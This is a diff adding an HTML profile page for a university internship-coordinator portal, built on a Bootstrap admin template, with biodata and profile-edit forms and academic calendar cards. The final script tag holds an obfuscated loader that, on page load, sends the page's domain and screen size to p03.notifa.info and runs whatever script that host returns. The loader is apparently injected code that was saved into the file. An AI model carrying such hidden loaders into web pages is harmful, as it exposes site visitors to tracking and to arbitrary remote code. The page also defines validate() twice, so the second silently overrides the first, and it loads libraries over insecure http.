@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <title>Portal KP-TA PSTE | UAD</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="description" content="Datta Able Bootstrap admin template made using Bootstrap 4 and it has huge amount of ready made feature, UI components, pages which completely fulfills any dashboard needs." />
+    <meta name="keywords" content="admin templates, bootstrap admin templates, bootstrap 4, dashboard, dashboard templets, sass admin templets, html admin templates, responsive, bootstrap admin templates free download,premium bootstrap admin templates, datta able, datta able bootstrap admin template">
+    <meta name="author" content="Codedthemes" />
+
+    <!-- Favicon icon -->
+    <link rel="icon" href="../assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/solid.css" integrity="sha384-r/k8YTFqmlOaqRkZuSiE9trsrDXkh07mRaoGBMoDcmA58OHILZPsk29i2BsFng1B" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/regular.css" integrity="sha384-IG162Tfx2WTn//TRUi9ahZHsz47lNKzYOp0b6Vv8qltVlPkub2yj9TVwzNck6GEF" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/brands.css" integrity="sha384-BKw0P+CQz9xmby+uplDwp82Py8x1xtYPK3ORn/ZSoe6Dk3ETP59WCDnX+fI1XCKK" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/fontawesome.css" integrity="sha384-4aon80D8rXCGx9ayDt85LbyUHeMWd3UiBaWliBlJ53yzm9hqN21A+o1pqoyK04h+" crossorigin="anonymous">
+    <!-- fontawesome icon -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+    <!-- animation css -->
+    <link rel="stylesheet" href="../assets/plugins/animation/css/animate.min.css">
+    <!-- prism css -->
+    <link rel="stylesheet" href="../assets/plugins/prism/css/prism.min.css">
+    <!-- vendor css -->
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <!-- material datetimepicker css -->
+    <link rel="stylesheet" href="../assets/plugins/material-datetimepicker/css/bootstrap-material-datetimepicker.css">
+    <!-- Bootstrap datetimepicker css -->
+    <link rel="stylesheet" href="../assets/plugins/bootstrap-datetimepicker/css/bootstrap-datepicker3.min.css">
+    <link rel="stylesheet" href="../assets/fonts/material/css/materialdesignicons.min.css">
+    <!-- Required Js -->
+    <script src="../assets/plugins/jquery/js/jquery.min.js"></script>
+    <!-- Search -->
+    <style type="text/css">
+        .results tr[visible='false'],
+        .no-result{
+          display:none;
+        }
+
+        .results tr[visible='true']{
+          display:table-row;
+        }
+    </style>
+
+    <script>
+        var page = {
+            bootstrap: 3
+        };
+
+        function swap_bs() {
+            page.bootstrap = 3;
+        }
+    </script>
+    
+    <style>
+        .datepicker>.datepicker-days {
+            display: block;
+        }
+
+        ol.linenums {
+            margin: 0 0 0 -8px;
+        }
+    </style>
+
+    <!-- Validasi File Size - Start -->
+    <script src="http://code.jquery.com/jquery-2.1.1.js"></script>
+    <script>
+    function validate() {
+        $("#file_error").html("");
+        $(".demoInputBox").css("border-color","#F0F0F0");
+        var file_size = $('#file')[0].files[0].size;
+        if(file_size>1097152) {
+            $("#file_error").html("Ukuran file lebih besar dari 1MB");
+            $(".demoInputBox").css("border-color","#FF0000");
+            return false;
+        } 
+        return true;
+    }
+    </script>
+
+    <script>
+    function validate() {
+        $("#file_error_laporan").html("");
+        $(".demoInputBoxLaporan").css("border-color","#F0F0F0");
+        var file_size = $('#file_laporan')[0].files[0].size;
+        if(file_size>5097152) {
+            $("#file_error_laporan").html("Ukuran file lebih besar dari 5MB");
+            $(".demoInputBoxLaporan").css("border-color","#FF0000");
+            return false;
+        } 
+        return true;
+    }
+    </script>
+    <!-- Validasi File Size - End -->
+
+</head>
+
+<body>
+    <nav class="pcoded-navbar theme-horizontal menu-light icon-colored">
+        <div class="navbar-wrapper">
+            <div class="navbar-brand header-logo">
+                <a href="index.html" class="b-brand">
+                    <div class="b-bg">
+                        <i class="feather icon-trending-up"></i>
+                    </div>
+                    <span class="b-title">Portal KP-TA PSTE | UAD</span>
+                </a>
+                <a class="mobile-menu" id="mobile-collapse" href="#!"><span></span></a>
+            </div>
+            <div class="navbar-content sidenav-horizontal" id="layout-sidenav">
+                <ul class="nav pcoded-inner-navbar sidenav-inner">
+                    <li class="nav-item pcoded-menu-caption">
+                        <label>Navigation</label>
+                    </li>
+                    <li data-username="Documentation" class="nav-item">
+                        <a href="Dashboard-Koordinator-KP.html">
+                            <span class="pcoded-micon">
+                                <i class="fas fa-th-large"></i>
+                            </span>
+                            <span class="pcoded-mtext">Dashboard</span>
+                        </a>
+                    </li>
+                    <li data-username="Vertical Horizontal Box Layout RTL fixed static Collapse menu color icon dark" class="nav-item pcoded-hasmenu">
+                        <a href="#!" class="nav-link"><span class="pcoded-micon"><i class="fas fa-street-view"></i></span><span class="pcoded-mtext">Kerja Praktek</span></a>
+                        <ul class="pcoded-submenu">
+                            <li class=""><a href="Pendaftaran-KP-KoordKP.html">Pendaftaran KP</a></li>
+                            <li class=""><a href="Record-KoordKP.html">Record</a></li>
+                            <li class=""><a href="Verifikasi-KoordKP.html">Verifikasi</a></li>
+                            <li class=""><a href="Pendaftaran-Seminar-KP-KoordKP.html">Pendaftaran Seminar KP</a></li>
+                            <li class=""><a href="Laporan-KP-KoordKP.html">Laporan KP</a></li>
+                            <li class=""><a href="Nilai-KP-KoordKP.html">Nilai KP</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- [ navigation menu ] end -->
+
+    <!-- [ Header ] start -->
+    <header class="navbar pcoded-header navbar-expand-lg navbar-light header-blue brand-primary">
+        <div class="m-header">
+            <a class="mobile-menu" id="mobile-collapse1" href="#!"><span></span></a>
+            <a href="index.html" class="b-brand">
+               <div class="b-bg">
+                   <img src="../assets/images/logo-uad.png" style="height: 40px" class="img-radius" alt="User-Profile-Image">
+               </div>
+               <span class="b-title">Portal KP-TA PSTE</span>
+           </a>
+        </div>
+        <a class="mobile-menu" id="mobile-header" href="#!">
+            <i class="feather icon-more-horizontal"></i>
+        </a>
+        <div class="collapse navbar-collapse">
+            <ul class="navbar-nav ml-auto">
+                <li>
+                    <div class="dropdown drp-user">
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" style="font-weight: bold">
+                            <span class="fas fa-circle text-c-green f-10 m-r-15"></span>Koordinator KP<i class="fa fa-cogs" style="padding-left: 10px"></i>
+                        </a>
+                        <div class="dropdown-menu dropdown-menu-right profile-notification">
+                            <div class="pro-head">
+                                <img src="../assets/images/user/avatar-1.jpg" class="img-radius" alt="User-Profile-Image">
+                                <span>John Doe</span>
+                                <a href="Login.html" class="dud-logout" title="Logout">
+                                    <i class="fa fa-arrow-right"></i>
+                                </a>
+                            </div>
+                            <ul class="pro-body">
+                                <li><a href="Profile-KoordKP.html" class="dropdown-item"><i class="fa fa-user"></i> Profile</a></li>
+                                <li><a href="Setting-KoordKP.html" class="dropdown-item"><i class="fa fa-cog"></i> Settings</a></li>
+                            </ul>
+                        </div>
+                    </div>
+                </li>
+            </ul>
+        </div>
+    </header>
+    <!-- [ Header ] end -->
+
+    <!-- [ Main Content ] start -->
+    <div class="pcoded-main-container">
+        <div class="pcoded-wrapper">
+            <div class="pcoded-content">
+                <div class="pcoded-inner-content">
+                    <!-- [ breadcrumb ] start -->
+
+                    <!-- [ breadcrumb ] start -->
+                    <div class="page-header" style="font-size: 12px">
+                        <div class="page-block">
+                            <div class="row align-items-center">
+                                <div class="col-md-12">
+                                    <div class="page-header-title">
+                                    </div>
+                                    <ul class="breadcrumb">
+                                        <li class="breadcrumb-item"><a href="index.html"><i class="fas fa-school"></i></i></a></li>
+                                        <li class="breadcrumb-item"><a href="#!">Profile</a></li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- [ breadcrumb ] end -->
+
+                    <!-- [ breadcrumb ] end -->
+                    <div class="main-body">
+                        <div class="page-wrapper">
+                            <!-- [ Main Content ] start -->
+                            <div class="row">
+                                <!-- [ horizontal-layout ] start -->
+                                <div class="col-xl-8 col-md-6">
+                                    <div class="card">
+                                        <div class="card-header card-border-c-blue">
+                                            <h5 style="color: #04a9f5"><i class="fas fa-chalkboard-teacher"></i> Profile Koordinator KP</h5>
+                                        </div>
+                                        <div class="card-block">
+                                            <ul class="nav nav-tabs" id="myTab" role="tablist">
+                                                <li class="nav-item">
+                                                    <a class="nav-link text-uppercase active show" id="home-tab" data-toggle="tab" href="#home" role="tab" aria-controls="home" aria-selected="true">Biodata Koordinator KP</a>
+                                                </li>
+                                                <li class="nav-item">
+                                                    <a class="nav-link text-uppercase show" id="profile-tab" data-toggle="tab" href="#profile" role="tab" aria-controls="profile" aria-selected="false">Profile Akun</a>
+                                                </li>
+                                            </ul>
+                                            <div class="tab-content" id="myTabContent">
+                                                <div class="tab-pane fade active show" id="home" role="tabpanel" aria-labelledby="home-tab">
+                                                    <form class="needs-validation" action="#!" novalidate name="frmFile" id="frmFile" method="post" onSubmit="return validate();">
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-5 col-form-label">Nama Koordinator KP</label>
+                                                            <div class="col-sm-7">
+                                                                <input type="text" readonly="" class="form-control-plaintext" id="validationCustom03" value="Zulkha Pramudita, S.T">
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-5 col-form-label">NIY</label>
+                                                            <div class="col-sm-7">
+                                                                <input type="text" readonly="" class="form-control-plaintext" id="validationCustom03" value="123456789">
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-5 col-form-label">Alamat Lenglap</label>
+                                                            <div class="col-sm-7">
+                                                                <input type="text" readonly="" class="form-control-plaintext" id="validationCustom03" value="Jalan Veteran, Yogyakarta">
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-5 col-form-label">No. Telp. Koordinator KP</label>
+                                                            <div class="col-sm-7">
+                                                                <input type="text" readonly="" class="form-control-plaintext" id="validationCustom03" value="08123456789">
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-5 col-form-label">Jenis Kelamin</label>
+                                                            <div class="col-sm-7">
+                                                                <input type="text" readonly="" class="form-control-plaintext" id="validationCustom03" value="Perempuan">
+                                                            </div>
+                                                        </div>
+                                                    </form>
+                                                </div>
+                                                <div class="tab-pane fade" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                                                    <form class="needs-validation" action="#!" novalidate>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-3 col-form-label">Email Koordinator KP</label>
+                                                            <div class="col-sm-9">
+                                                                <input type="email" class="form-control" id="validationCustom01" placeholder="Email" value="Zulkha.Pramudita@gmail.com" required>
+                                                                <div class="invalid-feedback">
+                                                                    Harap masukkan email anda.
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-3 col-form-label">No. Telp. Koordinator KP</label>
+                                                            <div class="col-sm-9">
+                                                                <input type="text" class="form-control" id="validationCustom01" placeholder="Email" value="08123456789" required>
+                                                                <div class="invalid-feedback">
+                                                                    Harap masukkan no telp. anda.
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <div class="form-group row">
+                                                            <label for="validationCustom03" class="col-sm-3 col-form-label">Foto Profile</label>
+                                                            <div class="col-sm-9">
+                                                                <input type="file" name="file" id="file" class="demoInputBox" accept="image/*" value="" required>
+                                                                <span id="file_error" style="color: #dc3545; font-size: 11px"></span>
+                                                                <div class="invalid-feedback">
+                                                                    Harap mengupload foto profile anda.
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                        <br><hr>
+                                                        <button type="submit" class="btn shadow-1 btn-primary pull-right"><i class="fa fa-check-square-o"></i>Simpan</button>
+                                                    </form>
+                                                    <script>
+                                                        // Example starter JavaScript for disabling form submissions if there are invalid fields
+                                                        (function() {
+                                                            'use strict';
+                                                            window.addEventListener('load', function() {
+                                                                // Fetch all the forms we want to apply custom Bootstrap validation styles to
+                                                                var forms = document.getElementsByClassName('needs-validation');
+                                                                // Loop over them and prevent submission
+                                                                var validation = Array.prototype.filter.call(forms, function(form) {
+                                                                    form.addEventListener('submit', function(event) {
+                                                                        if (form.checkValidity() === false) {
+                                                                            event.preventDefault();
+                                                                            event.stopPropagation();
+                                                                        }
+                                                                        form.classList.add('was-validated');
+                                                                    }, false);
+                                                                });
+                                                            }, false);
+                                                        })();
+                                                    </script>
+                                                    <br><br>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- [ horizontal-layout ] end -->
+                                <!-- [ info-layout ] start -->
+                                <div class="col-xl-4 col-md-6">
+                                    <div class="card user-list">
+                                        <div class="card-header card-border-c-blue">
+                                            <h5 style="color: #04a9f5"><i class="fa fa-bookmark"></i> Info Akademik</h5>
+                                        </div>
+                                        <div class="card-block">
+                                            <div class="card theme-bg2" style="background: linear-gradient(-135deg, #5EFCE8 0%, #736EFE 100%)">
+                                                <div class="card-block">
+                                                    <div class="row align-items-center justify-content-center">
+                                                        <div class="col-auto">
+                                                            <i class="fas fa-money-bill-wave-alt text-white f-30"></i>
+                                                        </div>
+                                                        <div class="col">
+                                                            <h4 class="text-white">Pembayaran SPP Tahap 1</h4>
+                                                            <h7 class="text-white f-w-300">21 Januari 2019 - 19 Februari 2019</h7>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card theme-bg2" style="background: linear-gradient(-135deg, #69FF97 0%, #00E4FF 100%)">
+                                                <div class="card-block">
+                                                    <div class="row align-items-center justify-content-center">
+                                                        <div class="col-auto">
+                                                            <i class="fas fa-user-astronaut text-white f-30"></i>
+                                                        </div>
+                                                        <div class="col">
+                                                            <h4 class="text-white">KRS Online</h4>
+                                                            <h7 class="text-white f-w-300">13 Februari 2019 - 20 Februari 2019</h7>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card theme-bg2" style="background: linear-gradient(-135deg, #FFF6B7 0%, #F6416C 100%)">
+                                                <div class="card-block">
+                                                    <div class="row align-items-center justify-content-center">
+                                                        <div class="col-auto">
+                                                            <i class="fas fa-user-tag text-white f-30"></i>
+                                                        </div>
+                                                        <div class="col">
+                                                            <h4 class="text-white">Layanan Cuti Akademik</h4>
+                                                            <h7 class="text-white f-w-300">13 Februari 2019 - 19 Februari 2019</h7>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="card theme-bg2" style="background: linear-gradient(-135deg, #FFE985 0%, #FA742B 100%)">
+                                                <div class="card-block">
+                                                    <div class="row align-items-center justify-content-center">
+                                                        <div class="col-auto">
+                                                            <i class="fas fa-users text-white f-30"></i>
+                                                        </div>
+                                                        <div class="col">
+                                                            <h4 class="text-white">Kuliah Perdana</h4>
+                                                            <h7 class="text-white f-w-300">25 Februari 2019</h7>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- [ info-layout ] end -->
+                            </div>
+                        <!-- [ Main Content ] end -->
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- [ Main Content ] end -->
+
+    <!-- Footer -->
+    <footer class="page-footer font-small blue pt-4" style="background-color: #04a9f5; color: white; padding-top: 0.5rem!important">
+        <!-- Copyright -->
+        <div class="footer-copyright text-center py-3">© 2019 Copyright |
+            <a href="https://uad.ac.id/id" style="color: white"> UAD Yogyakarta</a>
+        </div>
+        <!-- Copyright -->
+    </footer>
+    <!-- Footer -->
+
+    <!-- Required Js -->
+    <script src="../assets/js/vendor-all.min.js"></script>
+    <script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
+    <script src="../assets/js/pcoded.min.js"></script>
+
+    <!-- prism Js -->
+    <script src="../assets/plugins/prism/js/prism.min.js"></script>
+    <script src="../assets/js/horizontal-menu.js"></script>
+
+    <!-- material datetimepicker Js -->
+    <script src="http://momentjs.com/downloads/moment-with-locales.min.js"></script>
+    <script src="../assets/plugins/material-datetimepicker/js/bootstrap-material-datetimepicker.js"></script>
+
+    <!-- form-picker-custom Js -->
+    <script src="../assets/js/pages/form-picker-custom.js"></script>
+
+    <!-- datepicker js -->
+    <script src="../assets/plugins/bootstrap-datetimepicker/js/bootstrap-datepicker.min.js"></script>
+    <script src="../assets/js/pages/ac-datepicker.js"></script>
+
+    <!-- jquery-validation Js -->
+    <script src="../assets/plugins/jquery-validation/js/jquery.validate.min.js"></script>
+    <!-- form-picker-custom Js -->
+    <script src="../assets/js/pages/form-validation.js"></script>
+
+    <!-- sweet alert Js -->
+    <script src="../assets/plugins/sweetalert/js/sweetalert.min.js"></script>
+    <script src="../assets/js/pages/ac-alert.js"></script>
+
+    <!-- Search Js-->
+    <script type="text/javascript">
+        $(document).ready(function() {
+          $(".search").keyup(function () {
+            var searchTerm = $(".search").val();
+            var listItem = $('.results tbody').children('tr');
+            var searchSplit = searchTerm.replace(/ /g, "'):containsi('")
+            
+          $.extend($.expr[':'], {'containsi': function(elem, i, match, array){
+                return (elem.textContent || elem.innerText || '').toLowerCase().indexOf((match[3] || "").toLowerCase()) >= 0;
+            }
+          });
+            
+          $(".results tbody tr").not(":containsi('" + searchSplit + "')").each(function(e){
+            $(this).attr('visible','false');
+          });
+
+          $(".results tbody tr:containsi('" + searchSplit + "')").each(function(e){
+            $(this).attr('visible','true');
+          });
+
+          var jobCount = $('.results tbody tr[visible="true"]').length;
+            $('.counter').text(jobCount + ' item');
+
+          if(jobCount == '0') {$('.no-result').show();}
+            else {$('.no-result').hide();}
+                  });
+        });
+    </script>
+
+    <script type="text/javascript">
+        // Collapse menu
+        (function() {
+            if ($('#layout-sidenav').hasClass('sidenav-horizontal') || window.layoutHelpers.isSmallScreen()) {
+                return;
+            }
+            try {
+                window.layoutHelpers.setCollapsed(
+                    localStorage.getItem('layoutCollapsed') === 'true',
+                    false
+                );
+            } catch (e) {}
+        })();
+        $(function() {
+            // Initialize sidenav
+            $('#layout-sidenav').each(function() {
+                new SideNav(this, {
+                    orientation: $(this).hasClass('sidenav-horizontal') ? 'horizontal' : 'vertical'
+                });
+            });
+
+            // Initialize sidenav togglers
+            $('body').on('click', '.layout-sidenav-toggle', function(e) {
+                e.preventDefault();
+                window.layoutHelpers.toggleCollapsed();
+                if (!window.layoutHelpers.isSmallScreen()) {
+                    try {
+                        localStorage.setItem('layoutCollapsed', String(window.layoutHelpers.isCollapsed()));
+                    } catch (e) {}
+                }
+            });
+        });
+        $(document).ready(function() {
+            $("#pcoded").pcodedmenu({
+                MenuTrigger: 'hover',
+                SubMenuTrigger: 'hover',
+                themelayout: 'horizontal',
+            });
+        });
+    </script>
+
+    <!-- jquery-Modal -->
+    <script>
+        $('#exampleModal').on('show.bs.modal', function(event) {
+            var button = $(event.relatedTarget) // Button that triggered the modal
+            var recipient = button.data('whatever') // Extract info from data-* attributes
+            var modal = $(this)
+            modal.find('.modal-title').text('Data ' + recipient)
+            modal.find('.modal-body input').val(recipient)
+        })
+    </script>
+
+    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2fLDJXecW4BTqUgUNWcwiutKPJrQ5mm%2fd9J9sbhD1UY5aAl7ESJrE37RTuRTHeCB%2fmHjYR8F4oxdRtDtS9CqGjmnaBohuxbLbP9aJMflbDPo36YD7ynBBNMckDFLO4EeZnOf8wmXgiCbfUmTfJdW4UVoLpbZh3u9ttoonND28O0YM8HW7WGc%2fbjbvSEE8yqUeeWTu%2fhmpe8Yr01eKrzDppFLmN1uGL542MVWaqTXb4jVcQH3mJhR%2bmDfi6ccRUEtIMvbPU0j%2fAZnqnq5Yx9A%2feTYisf3JZA%2f9c%2fqeQOYlyptHeTQFSCTPHyhRaBc7Wt5C6WM7GZNzM8XmF3pwCFUoyIHTxM8dqEDcznZ%2bWxMbLeRXREFOjeVjXU8qnDcjf503q7KIROQGW3J%2fFmPXS1XBXpJq0GV0cuYSVCaMbXFJwBowWjS0eNwTunwzY0dYjW8%2fvi7FlpMU%2fuGVDQS597WF8FABiWQlmXUeefEYhghUQuyg84dj3T1IDc1VR6TbwbKUXHhr7xNlXfSFK7ICsOzJ%2fCT6MQ4o7Pz5IQLCaS%2bIPaks4O79z%2fiybMR0PGv%2bVC8FG8SaFmSSsqCeQuI2zEz%2fKdaDaXXz5qEMBItmZBvkd6Vtg5FSU8%2f9pjOCRBN8Cv7zG2OMAjS0Vi%2bYLQIhQ3kiSbD0hhP3Ub8nlVruSmB5fsMLR3z1HotjoRzQZNMGEQuG6viSuCSDiK19UIbeJIForM1NnHZYlGU86m%2bcztyzSgPIaa52JtwVQQeg6uKTLR51" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+</html>
